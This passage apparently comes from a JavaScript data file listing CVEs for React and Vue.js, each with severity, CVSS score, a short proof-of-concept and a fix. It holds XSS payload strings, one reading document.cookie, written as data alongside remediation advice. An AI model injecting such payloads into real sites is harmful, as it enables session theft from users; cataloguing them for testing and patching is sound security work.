# Fix: Apply KB5003173 Windows security update immediately.`
        },
    ],
    'React': [
        {
            cve: 'CVE-2021-24032', desc: 'React server-side rendering XSS via dangerouslySetInnerHTML when used with untrusted user input', severity: 'medium', cvss: 6.1,
            poc: `# POC: React SSR XSS
# Affected: Apps using dangerouslySetInnerHTML with user input

# Step 1: Find input reflected in React SSR output
# Look for dangerouslySetInnerHTML in source

# Step 2: Inject payload
"><img src=x onerror=alert(document.cookie)>

# Fix: Never use dangerouslySetInnerHTML with user input
# Use DOMPurify: import DOMPurify from 'dompurify';
# <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />`
        },
    ],
    'Vue.js': [
        {
            cve: 'CVE-2024-6783', desc: 'Vue.js < 3.4.31 XSS via v-bind with user-controlled class/style attribute values in SSR mode', severity: 'medium', cvss: 6.1,
            poc: `# POC: Vue SSR XSS via v-bind
# Affected: Vue.js < 3.4.31 (SSR mode)

# If user input is used in v-bind:class or v-bind:style:
<div v-bind:class="userInput">
# Payload: '"><script>alert(1)</script>'

# Fix: Upgrade Vue to >= 3.4.31
